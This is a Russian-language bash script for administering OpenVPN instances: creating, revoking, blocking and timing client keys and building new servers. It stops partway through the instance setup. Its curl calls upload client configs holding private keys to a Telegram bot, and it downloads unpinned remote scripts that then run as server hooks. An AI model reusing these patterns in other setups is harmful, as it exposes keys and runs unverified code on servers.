#!/bin/bash
#Pearl_OV_stable_26.04.24
#@hydrargyrum

Green_font_prefix="\033[32m" && Red_font_prefix="\033[31m" && Green_background_prefix="\033[42;37m" && Red_background_prefix="\033[41;37m" && Font_color_suffix="\033[0m" && Green="\033[32m" && Red="\033[31m" && Yellow="\033[33m" && Blue='\033[34m' && Purple='\033[35m' && Ocean='\033[36m' && Black='\033[37m' && Morg="\033[5m" && Reverse="\033[7m" && Font="\033[1m"
sh_ver="7.7.7"
Error="${Red_background_prefix}[Ошибка]${Font_color_suffix}"
Separator_1="——————————————————————————————"

# Подключение файла с переменными
source /usr/lib/pearl/tokens

[[ ! -e "/lib/cryptsetup/askpass" ]] && apt update && apt install cryptsetup -y
clear
if readlink /proc/$$/exe | grep -q "dash"; then
	echo 'Запустите скрипт через BASH'
	exit
fi

read -N 999999 -t 0.001

if [[ $(uname -r | cut -d "." -f 1) -eq 2 ]]; then
	echo "Обновите систему"
	exit
fi

if grep -qs "ubuntu" /etc/os-release; then
	os="ubuntu"
	os_version=$(grep 'VERSION_ID' /etc/os-release | cut -d '"' -f 2 | tr -d '.')
	group_name="nogroup"
elif [[ -e /etc/debian_version ]]; then
	os="debian"
	os_version=$(grep -oE '[0-9]+' /etc/debian_version | head -1)
	group_name="nogroup"
elif [[ -e /etc/centos-release ]]; then
	os="centos"
	os_version=$(grep -oE '[0-9]+' /etc/centos-release | head -1)
	group_name="nobody"
elif [[ -e /etc/fedora-release ]]; then
	os="fedora"
	os_version=$(grep -oE '[0-9]+' /etc/fedora-release | head -1)
	group_name="nobody"
else
	echo "Система не поддерживается."
	exit
fi

if [[ "$os" == "ubuntu" && "$os_version" -lt 1804 ]]; then
	echo "Версия Ubuntu слишком стара (необходим Ubuntu 18.04+)"
	exit
fi

if [[ "$os" == "debian" && "$os_version" -lt 9 ]]; then
	echo "Для скрипта необходим Debian 9+."
	exit
fi

if [[ "$os" == "centos" && "$os_version" -lt 7 ]]; then
	echo "Для скрипта необходим Centos 7+."
	exit
fi

if ! grep -q sbin <<< "$PATH"; then
	echo '$PATH does not include sbin. Try using "su -" instead of "su".'
	exit
fi

if [[ "$EUID" -ne 0 ]]; then
	echo "Используйте sudo su либо sudo (название скрипта)"
	exit
fi

if [[ ! -e /dev/net/tun ]] || ! ( exec 7<>/dev/net/tun ) 2>/dev/null; then
	echo "Драйвер TUN не установлен."
	exit
fi

main_menu() {
        clear
        echo -e "Приветствую, администратор сервера! Сегодня: ${Blue}$(date +"%d/%m/%Y")${Font_color_suffix}"
        echo -e "
    ${Blue}|-----------------------------------|${Font_color_suffix}
    ${Blue}|———————${Font_color_suffix} Управление ключами ${Blue}————————${Font_color_suffix}${Blue}|${Font_color_suffix}
    ${Blue}|1.${Font_color_suffix} ${Yellow}Создать ключ${Font_color_suffix}                    ${Blue}|${Font_color_suffix}
    ${Blue}|2.${Font_color_suffix} ${Yellow}Удалить ключ${Font_color_suffix}                    ${Blue}|${Font_color_suffix}
    ${Blue}|3.${Font_color_suffix} ${Yellow}Информация о клиентах${Font_color_suffix}           ${Blue}|${Font_color_suffix}
    ${Blue}|4.${Font_color_suffix} ${Yellow}Отправить ключ в Telegram${Font_color_suffix}       ${Blue}|${Font_color_suffix}
    ${Blue}|5.${Font_color_suffix} ${Yellow}Управление доступом${Font_color_suffix}             ${Blue}|${Font_color_suffix}
    ${Blue}|6.${Font_color_suffix} ${Yellow}Управление сроками${Font_color_suffix}              ${Blue}|${Font_color_suffix}
    ${Blue}|——————${Font_color_suffix} Управление инстансами ${Blue}——————${Font_color_suffix}${Blue}|${Font_color_suffix}
    ${Blue}|7.${Font_color_suffix} ${Yellow}Создать новый инстанс OpenVPN${Font_color_suffix}   ${Blue}|${Font_color_suffix}
    ${Blue}|8.${Font_color_suffix} ${Yellow}Управление инстансами${Font_color_suffix}           ${Blue}|${Font_color_suffix}
    ${Blue}|9.${Font_color_suffix} ${Yellow}Удалить инстанс OpenVPN${Font_color_suffix}         ${Blue}|${Font_color_suffix}
    ${Blue}|——————${Font_color_suffix} Резервное копирование ${Blue}——————${Font_color_suffix}${Blue}|${Font_color_suffix}
    ${Blue}|10.${Font_color_suffix} ${Yellow}Установить инстанс из архива${Font_color_suffix}   ${Blue}|${Font_color_suffix}
    ${Blue}|11.${Font_color_suffix} ${Yellow}Создать резервную копию${Font_color_suffix}        ${Blue}|${Font_color_suffix}
    ${Blue}|———————————————————————————————————|${Font_color_suffix}
    ${Blue}|12.${Font_color_suffix} ${Yellow}Выход${Font_color_suffix}                          ${Blue}|${Font_color_suffix}
    ${Blue}|-----------------------------------|${Font_color_suffix}"
        read -p "Действие: " option
        case "$option" in
            1)
            adduser
            ;;
            2)
            deleteuser
            ;;
            3)
            get_client_info
            ;;
            4)
            send_ovpn_to_telegram
            ;;
            5)
            user_access_control
            ;;
            6)
            user_lifetime_redactor
            ;;
            7)
            OV_instance_adding
            ;;
            8)
            instance_management
            ;;        
            9)
            delete_OV_instance
            ;;
            10)
            install_instance_from_backup
            ;;
            11)
            create_instance_backup
            ;;
            12)
            exit 1
            ;;        
            *)
        esac    
}

adduser() {
    clear
    select_openvpn_instance
    clear

    if [ "${#selected_instance[@]}" -gt 1 ]; then
        echo "Функция не может быть выполнена для нескольких инстансов одновременно."
        exit 1
    fi

    local config_mode

    while true; do
        echo "Режимы создания:"
        echo "1. Автоматический режим"
        echo "2. Ручной режим"
        echo "3. Импорт списка"
        echo "4. Отмена"

        read -p "Выберите режим создания конфигураций клиентов (1;2;3): " config_mode

        case $config_mode in
            1)
                clear
                read -p "Введите префикс для конфигураций клиентов: " config_prefix
                read -p "Выберите количество конфигураций клиентов для создания: " num_clients
                read -p "Укажите срок действия (кол-во дней, по умолчанию 30): " days
                days=${days:-30}  # Используем значение по умолчанию, если пользователь оставил поле пустым
                read -p "Настройка E-mail (оставить пустым для пропуска): " email

                for ((i = 1; i <= num_clients; i++)); do
                    client_name="${config_prefix}_$i"
                    ticks=$(days_to_ticks "$days")
                    create_client_config "$client_name" "$ticks" "$email"
                done
                break
                ;;
            2)
                clear
                read -p "Введите количество конфигураций клиентов для создания: " num_clients

                for ((i = 1; i <= num_clients; i++)); do
                    echo
                    read -p "Введите имя для клиента $i: " unsanitized_client
                    read -p "Укажите срок действия (кол-во дней, по умолчанию 30): " days
                    days=${days:-30}  # Используем значение по умолчанию, если пользователь оставил поле пустым
                    read -p "Настройка E-mail (оставить пустым для пропуска): " email

                    client=$(sed 's/[^0-9a-zA-Z_-]/_/g' <<< "$unsanitized_client")
                    while [[ -z "$client" || -e "/etc/openvpn/${selected_instance[0]}/easy-rsa/pki/issued/$client.crt" ]]; do
                        echo "$client: Неправильно введено имя или оно уже существует"
                        read -p "Имя: " unsanitized_client
                        client=$(sed 's/[^0-9a-zA-Z_-]/_/g' <<< "$unsanitized_client")
                    done

                    ticks=$(days_to_ticks "$days")
                    create_client_config "$client" "$ticks" "$email"
                done
                break
                ;;
            3)
                clear
                # Проверяем наличие файла с клиентами
                if [ -f "/usr/lib/pearl/tmp/table-import" ]; then
                    # Выводим значения из файла
                    > /usr/lib/pearl/tmp/table-import
                    nano "/usr/lib/pearl/tmp/table-import"
                    echo "Список клиентов для создания конфигураций:"
                    cat "/usr/lib/pearl/tmp/table-import"
                    
                    # Запрос подтверждения от пользователя
                    read -p "Вы хотите создать конфигурации для этих клиентов? (y/n): " confirm
                    if [ "$confirm" == "y" ]; then
                        # Запрос пользовательского ввода для количества дней
                        read -p "Укажите срок действия (количество дней, по умолчанию 30): " days
                        days=${days:-30}  # Используем значение по умолчанию, если пользователь оставил поле пустым

                        # Создание конфигураций для каждого клиента из списка
                        while IFS= read -r client_name; do
                            if [ -n "$client_name" ]; then
                                ticks=$(days_to_ticks "$days")
                                create_client_config "$client_name" "$ticks" ""
                            fi
                        done < "/usr/lib/pearl/tmp/table-import"
                        > /usr/lib/pearl/tmp/table-import
                        break
                    else
                        echo "Отмена."
                    fi
                else
                    echo "Файл со списком клиентов не найден."
                fi
                ;;
            4)
                clear
                echo "Прекращение операции. Выход."
                exit 1
                ;;
            *)
                clear
                echo "Неверный выбор. Пожалуйста, выберите снова."
                ;;
        esac
    done
}



days_to_ticks() {
    local days="$1"
    local ticks=$((days * 48))
    echo "$ticks"
}

ticks_to_days(){
    local ticks="$1"
    local days=$(echo "scale=1; $ticks / 48" | bc)
    echo "$days"
}


create_client_config() {
    local client_name="$1"
    local ticks="$2"
    local email="$3"

    local instance_path="/etc/openvpn/${selected_instance[0]}"
    local easy_rsa_path="$instance_path/easy-rsa"
    local client_common="$instance_path/client-common.txt"

    if [[ ! -d "$instance_path" || ! -d "$easy_rsa_path" || ! -f "$client_common" ]]; then
        echo "Ошибка: Отсутствуют необходимые файлы или каталоги."
        exit 1
    fi

    cd "$easy_rsa_path"
    EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-client-full "$client_name" nopass

    {
        cat "$client_common"
        echo "<ca>"
        cat "$easy_rsa_path/pki/ca.crt"
        echo "</ca>"
        echo "<cert>"
        sed -ne '/BEGIN CERTIFICATE/,$ p' "$easy_rsa_path/pki/issued/$client_name.crt"
        echo "</cert>"
        echo "<key>"
        cat "$easy_rsa_path/pki/private/$client_name.key"
        echo "</key>"
        echo "<tls-crypt>"
        sed -ne '/BEGIN OpenVPN Static key/,$ p' "$instance_path/tc.key"
        echo "</tls-crypt>"
    } > ~/OVPNConfigs/${selected_instance[0]}/"$client_name".ovpn

    local ccd_path="$instance_path/ccd"
    local ccd_file="$ccd_path/$client_name"
    echo "#connected=" > "$ccd_file"
    echo "#access=granted" >> "$ccd_file"
    echo "#ticks_remaining=$ticks" >> "$ccd_file"
    echo "#user_email=$email" >> "$ccd_file"
    sudo chown nobody:nogroup "$ccd_file"

    curl -s -F "chat_id=$chat_id" -F document=@"/root/OVPNConfigs/$selected_instance/$client_name.ovpn" "https://api.telegram.org/bot$api_token/sendDocument"
    
    clear
    
    echo "Клиентская конфигурация успешно создана. Файл отправлен в Telegram."
}


deleteuser() {
    clear
    select_openvpn_instance
    if [ "${#selected_instance[@]}" -gt 1 ]; then
        echo "Функция не может быть выполнена для нескольких инстансов одновременно."
        return 1
    fi
    clear
    client_selection "Выберите клиента для удаления (можно выбрать несколько через запятую): "

    # Проверка, что был выбран хотя бы один клиент
    if [ -z "$selected_client" ]; then
        echo "Отмена операции. Не выбран ни один клиент для удаления."
        return 1
    fi

    # Разбиваем выбранных клиентов на массив
    IFS=',' read -ra client_list <<< "$selected_client"
    
    clear
    
    echo "Выбранные клиенты:"
    for client in "${client_list[@]}"; do
        echo "$client"
    done
    read -p "Вы уверены, что хотите удалить всех выбранных клиентов? [y/N]: " confirm

    if [[ "$confirm" =~ ^[yY]$ ]]; then
        for client in "${client_list[@]}"; do
            cd "/etc/openvpn/${selected_instance[0]}/easy-rsa/"
            ./easyrsa --batch revoke "$client"
            EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl
            rm -f "/etc/openvpn/${selected_instance[0]}/crl.pem"
            cp "/etc/openvpn/${selected_instance[0]}/easy-rsa/pki/crl.pem" "/etc/openvpn/${selected_instance[0]}/crl.pem"
            chown nobody:nogroup "/etc/openvpn/${selected_instance[0]}/crl.pem"
            echo
            rm "/root/OVPNConfigs/${selected_instance[0]}/$client.ovpn"
            rm "/etc/openvpn/${selected_instance[0]}/ccd/$client"
            echo "Клиент '$client' удален!"
        done
    else
        echo "Удаление выбранных клиентов отменено!"
    fi

    clear
}




get_client_info(){
    clear
    select_openvpn_instance
    if [ "${#selected_instance[@]}" -gt 1 ]; then
        clear
        echo "Функция не может быть выполнена для нескольких инстансов одновременно."
        exit 1
    fi
    clear
    client_selection
    clear
    echo "На этом всё, необходимо дописать функцию"
}

user_access_control() {
    clear
    select_openvpn_instance
    if [ "${#selected_instance[@]}" -gt 1 ]; then
        clear
        echo "Функция не может быть выполнена для нескольких инстансов одновременно."
        exit 1
    fi
    local selected_instance="$selected_instance"
    clear
    client_selection
    local selected_client="$selected_client"
    local ccd_file="/etc/openvpn/$selected_instance/ccd/$selected_client"
    clear
    PS3="Выберите действие для клиента $selected_client в инстансе $selected_instance: "
    options=("Разблокировать" "Заблокировать" "Отмена")
    select opt in "${options[@]}"; do
        case $opt in
            "Разблокировать")
                if grep -q "#access=denied" "$ccd_file"; then
                    sed -i 's/#access=denied/#access=granted/' "$ccd_file"
                    clear
                    echo "Клиент $selected_client разблокирован."
                else
                    clear
                    echo "Клиент $selected_client уже разблокирован."
                fi
                break
                ;;
            "Заблокировать")
                if grep -q "#access=granted" "$ccd_file"; then
                    sed -i 's/#access=granted/#access=denied/' "$ccd_file"
                    clear
                    echo "Клиент $selected_client заблокирован."
                else
                    clear
                    echo "Клиент $selected_client уже заблокирован."
                fi
                break
                ;;
            "Отмена")
                clear
                echo "Операция отменена."
                break
                ;;
            *)
                echo "Некорректный выбор."
                ;;
        esac
    done
}

user_lifetime_redactor() {
    clear
    select_openvpn_instance
    if [ "${#selected_instance[@]}" -gt 1 ]; then
        clear
        echo "Функция не может быть выполнена для нескольких инстансов одновременно."
        exit 1
    fi
    local selected_instance="$selected_instance"
    clear
    client_selection
    local selected_client="$selected_client"
    local ccd_file="/etc/openvpn/$selected_instance/ccd/$selected_client"
    current_ticks=$(grep -E -o '^[^#]*#?ticks_remaining=[0-9]+' "$ccd_file" | cut -d'=' -f2)
    
    while true; do
        echo "===== Меню продления срока действия ====="
        echo "1. Продлить на 30 дней"
        echo "2. Продлить на 7 дней"
        echo "3. Указать вручную"
        echo "4. Отмена"
        read -p "Выберите действие (1/2/3/4): " choice

        case $choice in
            1)
                # Продление на 30 дней
                ticks_to_add=1440
                break
                ;;
            2)
                # Продление на 7 дней
                ticks_to_add=336
                break
                ;;
            3)
                # Указать вручную
                read -p "Введите количество дней: " days
                ticks_custom=$(days_to_ticks "$days")
                sed -i "s/#ticks_remaining=[0-9]*/#ticks_remaining=$ticks_custom/" "$ccd_file"
                clear
                echo "Срок действия клиента $selected_client успешно изменён на $days дней."
                exit 0
                ;;
            4)
                # Отмена
                exit 0
                ;;
            *)
                echo "Неверный выбор. Повторите ввод."
                ;;
        esac
    done
    days=$(ticks_to_days "$ticks_to_add")
    new_ticks=$((current_ticks + ticks_to_add))
    sed -i "s/#ticks_remaining=[0-9]*/#ticks_remaining=$new_ticks/" "$ccd_file"
    clear
    echo "Срок действия клиента $selected_client успешно продлен на $days дней."
}

send_ovpn_to_telegram() {
    clear
    select_openvpn_instance
    if [ "${#selected_instance[@]}" -gt 1 ]; then
        clear
        echo "Функция не может быть выполнена для нескольких инстансов одновременно."
        exit 1
    fi

    local selected_instance="$selected_instance"
    clear

    select_openvpn_client
    local selected_clients="$selected_client"

    IFS=',' read -ra client_list <<< "$selected_clients"
    
    clear
    
    echo "Выбранные клиенты:"
    for selected_client in "${client_list[@]}"; do
        echo "$selected_client"
    done

    read -p "Вы уверены, что хотите отправить файлы конфигурации выбранных клиентов в Telegram? [y/N]: " confirm

    if [[ "$confirm" =~ ^[yY]$ ]]; then
        for selected_client in "${client_list[@]}"; do
            local ovpn_file="/root/OVPNConfigs/$selected_instance/$selected_client.ovpn"
            if [[ -f "$ovpn_file" ]]; then
                curl -s -F "chat_id=$chat_id" -F document=@"$ovpn_file" "https://api.telegram.org/bot$api_token/sendDocument"
                echo "Файл конфигурации для клиента '$selected_client' отправлен в Telegram."
            else
                echo "Файл конфигурации для клиента '$selected_client' не найден: $ovpn_file"
            fi
        done
    else
        echo "Отправка файлов конфигурации в Telegram отменена."
    fi
}



client_selection() {
    echo "Выберите фильтр:"
    echo "1. Отобразить всех пользователей"
    echo "2. Фильтр по ключ-слову"
    read -p "Введите номер фильтра (1-2): " filter_choice

    case $filter_choice in
        1)
            name_filter=""
            days_filter=""
            ;;
        2)
            read -p "Введите ключ-фразу для фильтрации по имени клиента: " name_filter
            days_filter=""
            ;;
        3)
            read -p "Введите значение для фильтрации по оставшимся дням: " days_filter
            name_filter=""
            ;;
        *)
            echo "Некорректный выбор. Отобразим всех пользователей."
            name_filter=""
            days_filter=""
            ;;
    esac
    clear
    select_openvpn_client "$name_filter" "$days_filter"
}

select_openvpn_client() {
    echo "===== Список клиентов ====="
    echo "--------------------------------------------------------------------------------------------"
    printf "%-2s | %-30s | %-8s | %-15s | %-12s | %-15s\n" "№" "Имя" "Статус" "Дата создания" "Осталось дней" "Локальный IP"
    echo "--------------------------------------------------------------------------------------------"

    clients=($(tail -n +2 /etc/openvpn/$selected_instance/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2))
    number_of_clients=${#clients[@]}

    if [[ "$number_of_clients" -eq 0 ]]; then
        echo "Клиенты отсутствуют!"
        exit
    fi

    # Фильтр 1: по ключ-фразе
    name_filter="$1"

    # Фильтр 2: по оставшимся дням
    days_filter="$2"

    selected_clients=() # Создаем массив для хранения выбранных клиентов

    for i in "${!clients[@]}"; do
        client_name="${clients[$i]}"
        client_status=$(get_client_status "$client_name" "$selected_instance")
        client_cert_count=$(ls -1q /etc/openvpn/$selected_instance/easy-rsa/pki/issued | grep "^$client_name" | wc -l)
        client_creation_date=$(stat -c %y /etc/openvpn/$selected_instance/easy-rsa/pki/issued/"$client_name".crt | cut -d " " -f 1)
        local_ip_file="/etc/openvpn/$selected_instance/ccd/$client_name"
        local_ip=""

        if [ -f "$local_ip_file" ]; then
            local_ip=$(grep -oP 'ifconfig-push \K[\d.]+' "$local_ip_file")
        fi

        remaining_days=$(get_client_lifetime "$client_name" "$selected_instance")

        # Применяем фильтры
        if [[ -z "$name_filter" || "$client_name" == *"$name_filter"* ]] && \
           [[ -z "$days_filter" || ( "$remaining_days" -ge $(echo "$days_filter - 0.5" | bc) && "$remaining_days" -le $(echo "$days_filter + 0.5" | bc) ) ]]; then
            printf "%-2s | %-30s | %-8s | %-15s | %-12s | %-15s\n" "$((i+1))" "$client_name" "$client_status" "$client_creation_date" "$remaining_days" "$local_ip"
            selected_clients+=("$client_name") # Добавляем выбранных клиентов в массив
        fi
    done

    echo "--------------------------------------------------------------------------------------------"

    read -p "Выберите клиентов: (1-${number_of_clients}, 'all', или перечислите номера через запятую или диапазон через тире): " client_input

    selected_clients=()

    if [[ "$client_input" == "all" ]]; then
        selected_clients=("${clients[@]}")
    else
        IFS=', ' read -r -a client_numbers_array <<< "$client_input"
        for client_number_range in "${client_numbers_array[@]}"; do
            if [[ "$client_number_range" =~ ([0-9]+)-([0-9]+) ]]; then
                for client_number in $(seq ${BASH_REMATCH[1]} ${BASH_REMATCH[2]}); do
                    if [ "$client_number" -ge 1 ] && [ "$client_number" -le "$number_of_clients" ]; then
                        selected_clients+=("${clients[$((client_number - 1))]}")
                    else
                        echo "Некорректный выбор клиентов: $client_number"
                    fi
                done
            elif [ "$client_number_range" -ge 1 ] && [ "$client_number_range" -le "$number_of_clients" ]; then
                selected_clients+=("${clients[$((client_number_range - 1))]}")
            else
                echo "Некорректный выбор клиентов: $client_number_range"
            fi
        done
    fi

    # Передаем выбранных клиентов через переменную selected_client
    selected_client=$(printf "%s," "${selected_clients[@]}")
    selected_client=${selected_client%,} # Удаляем последнюю запятую, если есть
}





select_openvpn_instance() {
    echo "===== Список OpenVPN Инстансов ====="
    echo "-----------------------------------------------------------------------------------------------------------------------"
    echo " №  | Состояние | Имя        | Локальная подсеть | Используемый домен | Клиенты | Клиенты онлайн "
    echo "-----------------------------------------------------------------------------------------------------------------------"
    
    instances=($(find /etc/openvpn -maxdepth 1 -type d -name "server-*" -exec basename {} \; | sort))
    instances_count="${#instances[@]}"

    for i in "${!instances[@]}"; do
        instance_name="${instances[$i]}"
        instance_status=$(get_instance_status "$instance_name")
        client_count=$(tail -n +2 /etc/openvpn/$instance_name/easy-rsa/pki/index.txt | grep -c "^V")  
        local_subnet=$(grep -oP 'server \K[\d.]+(?= [0-9.]+)' /etc/openvpn/$instance_name/server.conf)
        instance_domain=$(grep -oP 'remote\s+\K\S+' /etc/openvpn/$instance_name/client-common.txt)
        shown_instance_name=$instance_name

        # Проверяем, содержится ли строка со словом "scramble" в файле server.conf
        if grep -q 'scramble' /etc/openvpn/$instance_name/server.conf; then
            shown_instance_name="${shown_instance_name} #"
        fi

        if [[ "$instance_name" =~ ^server-(.+)-([0-9]+)$ ]]; then
            protocol="${BASH_REMATCH[1]}"
            port="${BASH_REMATCH[2]}"
        else
            protocol="unknown"
            port="unknown"
        fi
        
        connected_count=$(grep -l "#connected=true" /etc/openvpn/$instance_name/ccd/* 2>/dev/null | wc -l)
        
        printf " %-2s | %-10s | %-18s | %-17s | %-20s | %-7s | %-14s\n" "$((i+1))" "$instance_status" "$shown_instance_name" "$local_subnet" "$instance_domain" "$client_count" "$connected_count"
    done

    echo "-----------------------------------------------------------------------------------------------------------------------"
    
    read -p "Выберите инстанс (1,2,3;1-3,all, Отмена): " instance_choice
    
    if [ "$instance_choice" == "all" ]; then
        selected_instance=("${instances[@]}")
        return 0
    elif [ "$instance_choice" == "Отмена" ]; then
        echo "Отмена выбора"
        return 1
    fi
    
    IFS=',' read -ra choice_parts <<< "$instance_choice"
    
    for part in "${choice_parts[@]}"; do
        if [[ "$part" =~ ^([0-9]+)-([0-9]+)$ ]]; then
            start_range="${BASH_REMATCH[1]}"
            end_range="${BASH_REMATCH[2]}"
            
            if [ "$start_range" -ge 1 ] && [ "$end_range" -le "$instances_count" ] && [ "$start_range" -le "$end_range" ]; then
                selected_instance+=("${instances[@]:$((start_range - 1)):$((end_range - start_range + 1))}")
            else
                echo "Неверный диапазон. Пожалуйста, введите корректный диапазон от 1 до $instances_count, 'all' или 'Отмена'"
                return 1
            fi
        elif [[ "$part" =~ ^[0-9]+$ ]]; then
            if [ "$part" -ge 1 ] && [ "$part" -le "$instances_count" ]; then
                selected_instance+=("${instances[$((part - 1))]}")
            else
                echo "Неверный номер инстанса. Пожалуйста, введите номер от 1 до $instances_count, 'all' или 'Отмена'"
                return 1
            fi
        else
            echo "Неверный ввод. Пожалуйста, введите номер(ы) от 1 до $instances_count, диапазон(ы), 'all' или 'Отмена'"
            return 1
        fi
    done
    
    return 0
}




get_instance_status() {
    local instance_name="$1"
    local openvpn_status=$(systemctl is-active "openvpn-$instance_name.service" 2>/dev/null)
    local iptables_status=$(systemctl is-active "iptables-openvpn-$instance_name.service" 2>/dev/null) 

    if [[ "$openvpn_status" == "active" && "$iptables_status" == "active" ]]; then
        echo -e "\e[32m\u25CF\e[0m"  # Зеленый кружок
    elif [[ "$openvpn_status" == "active" && "$iptables_status" == "inactive" ]]; then
        echo -e "\e[33m\u25CF\e[0m"  # Желтый кружок
    else
        echo -e "\e[31m\u25CF\e[0m"  # Красный кружок
    fi
}

get_client_status() {
    local client_name="$1"
    local selected_instance="$2"
    local ccd_file="/etc/openvpn/$selected_instance/ccd/$client_name"

    if [[ -f "$ccd_file" ]]; then
        local access_status=$(grep -E -o '^[^#]*#?access=[a-zA-Z]*' "$ccd_file" | cut -d'=' -f2)
        local connected_status=$(grep -E -o '^[^#]*#?connected=[a-zA-Z]*' "$ccd_file" | cut -d'=' -f2)
        if [[ "$connected_status" == "true" && "$access_status" == "granted" ]]; then
            echo -e "\e[32m\u25CF\e[0m"  # Зеленый кружок 
        elif [[ "$connected_status" == "false" && "$access_status" == "granted" ]]; then
            echo -e "\e[31m\u25CF\e[0m"  # Красный кружок 
        elif [[ "$connected_status" == "false" && "$access_status" == "denied" ]]; then
            echo -e "\e[1;31m\u2715\e[0m"  # Жирное красное перекрестие
        elif [[ "$connected_status" == "true" && "$access_status" == "denied" ]]; then
            echo -e "\e[1;32;41m\u2715\e[0m"  # Жирное зеленое перекрестие с красным фоном
        elif [[ "$connected_status" == "" && "$access_status" == "denied" ]]; then
            echo -e "\e[1;33m\u2715\e[0m" # Жирное желтое перекрестие
        else
            echo -e "\e[33m\u25CF\e[0m"  # Желтый кружок для неопределенного статуса
        fi
    else
        echo -e "\e[33m\u25CF\e[0m"  # Желтый кружок для отсутствующего файла
    fi
}

get_client_lifetime() {
    local client_name="$1"
    local selected_instance="$2"
    local ccd_file="/etc/openvpn/$selected_instance/ccd/$client_name"

    if [[ -f "$ccd_file" ]]; then
        local ticks_remaining=$(grep -E -o '^[^#]*#?ticks_remaining=[0-9]+' "$ccd_file" | cut -d'=' -f2)

        if [[ "$ticks_remaining" -gt 0 ]]; then
            ticks_to_days "$ticks_remaining"
        else
            echo "0"
        fi
    else
        echo "0"
    fi
}



get_instance_info(){
    clear
    select_openvpn_instance
    clear
    echo "На этом всё, необходимо дописать функцию"
}

add_OV_instance(){
    interface_name=$(ip route | grep default | awk '{print $5}')
    ip_address=$(ip -4 addr show dev "$interface_name" | grep -oP 'inet \K[\d.]+')
    while true; do
        read -p "Введите IP-адрес или доменное имя: " domain_or_ip
        if [[ $domain_or_ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            IFS='.' read -ra OCTETS <<< "$domain_or_ip"
            valid_ip=true
            for octet in "${OCTETS[@]}"; do
                if (( octet < 0 || octet > 255 )); then
                    valid_ip=false
                    break
                fi
            done
            if [ "$valid_ip" = true ]; then
                echo "Введенный IP-адрес: $domain_or_ip"
                break
            else
                echo "Ошибка: Введите корректный IP-адрес."
            fi
        else
            echo "Введенный IP-адрес или доменное имя: $domain_or_ip"
            break
        fi
    done

    while true; do
        read -p "Введите протокол (udp или tcp): " proto
        if [[ "$proto" == "udp" || "$proto" == "tcp" ]]; then
            echo "Выбранный протокол: $proto"
            break  
        else
            echo "Ошибка: Введите 'udp' или 'tcp' в качестве протокола."
        fi
    done

    while true; do
        read -p "Введите порт (1-65535): " prt
        if [[ "$prt" -ge 1 && "$prt" -le 65535 ]]; then
            echo "Введенный порт: $prt"
            break 
        else
            echo "Ошибка: Введите порт в диапазоне от 1 до 65535."
        fi
    done

    while true; do
        read -p "Введите локальную подсеть (формат x.x.x.x/xx): " SUBNET
        if [[ "$SUBNET" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\/[0-9]+$ ]]; then
            EDITED_SUBNET=$(echo "$SUBNET" | sed 's/\/[0-9]*$//g')
            echo "Подсеть без диапазона: $EDITED_SUBNET"
            break  
        else
            echo "Неверный формат подсети"
        fi
    done

    path_to_conf="/etc/openvpn/server-$proto-$prt"

    mkdir -p $path_to_conf

    wget -O "$path_to_conf/connect_script.sh" "https://raw.githubusercontent.com/hydrargyrum0/Pearl_OV/main/connect_script.sh"
    sed -i "s%\$path_to_conf%$path_to_conf%g" "$path_to_conf/connect_script.sh"
    chmod +x $path_to_conf/connect_script.sh
    sudo chown nobody:nogroup $path_to_conf/connect_script.sh

    wget -O "$path_to_conf/reset_script.sh" https://raw.githubusercontent.com/hydrargyrum0/Pearl_OV/main/reset_script.sh 
    sed -i "s%\$path_to_conf%$path_to_conf%g" "$path_to_conf/reset_script.sh"
    chmod +x $path_to_conf/reset_script.sh
    sudo chown nobody:nogroup $path_to_conf/reset_script.sh

    mkdir -p $path_to_conf/easy-rsa/
    easy_rsa_url='https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.8/EasyRSA-3.0.8.tgz'
    { wget -qO- "https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.8/EasyRSA-3.0.8.tgz" 2>/dev/null || curl -sL "$easy_rsa_url" ; } | tar xz -C $path_to_conf/easy-rsa/ --strip-components 1
    chown -R root:root $path_to_conf/easy-rsa/
    cd $path_to_conf/easy-rsa/
    echo "set_var EASYRSA_KEY_SIZE 2048" >vars
    ./easyrsa init-pki
    ./easyrsa --batch build-ca nopass
    EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-server-full server nopass
    EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl
    cp pki/ca.crt pki/private/ca.key pki/issued/server.crt pki/private/server.key pki/crl.pem $path_to_conf
    chown nobody:nogroup $path_to_conf/crl.pem
    chmod o+x $path_to_conf/
    openvpn --genkey secret $path_to_conf/tc.key

    echo "port $prt
    proto $proto
    dev tun
    user nobody
    group nogroup
    persist-key
    persist-tun
    keepalive 5 15
    topology subnet
    server $EDITED_SUBNET 255.255.0.0
    ifconfig-pool-persist $path_to_conf/ipp.txt
    push \"redirect-gateway def1 bypass-dhcp\"
    push \"dhcp-option DNS 8.8.8.8\"
    push \"dhcp-option DNS 8.8.4.4\"
    dh none
    tls-crypt $path_to_conf/tc.key
    crl-verify $path_to_conf/crl.pem
    ca $path_to_conf/ca.crt
    cert $path_to_conf/server.crt
    key $path_to_conf/server.key
    auth SHA256
    cipher CHACHA20-POLY1305
    data-ciphers CHACHA20-POLY1305:AES-128-GCM
    tls-server
    tls-version-min 1.2
    tls-ciphersuites TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256
    status $path_to_conf/openvpn-status.log
    script-security 2
    client-connect $path_to_conf/connect_script.sh
    client-disconnect $path_to_conf/connect_script.sh
    verb 0
    mute 10
    push \"route 95.85.96.0 255.255.224.0 net_gateway\"
    push \"route 95.47.57.0 255.255.255.0 net_gateway\"
    push \"route 217.174.224.0 255.255.240.0 net_gateway\"
    push \"route 185.69.187.0 255.255.255.0 net_gateway\"
    push \"route 185.69.186.0 255.255.255.0 net_gateway\"
    push \"route 185.69.185.0 255.255.255.0 net_gateway\"
    push \"route 185.246.72.0 255.255.252.0 net_gateway\"
    push \"route 93.171.220.0 255.255.252.0 net_gateway\"
    push \"route 216.250.8.0 255.255.248.0 net_gateway\"
    push \"route 185.69.184.0 255.255.255.0 net_gateway\"
    push \"route 177.93.143.0 255.255.255.0 net_gateway\"
    push \"route 119.235.112.0 255.255.240.0 net_gateway\"
    push \"route 103.220.0.0 255.255.252.0 net_gateway\"
    push \"route 192.168.0.0 255.255.0.0 net_gateway\"" > $path_to_conf/server.conf
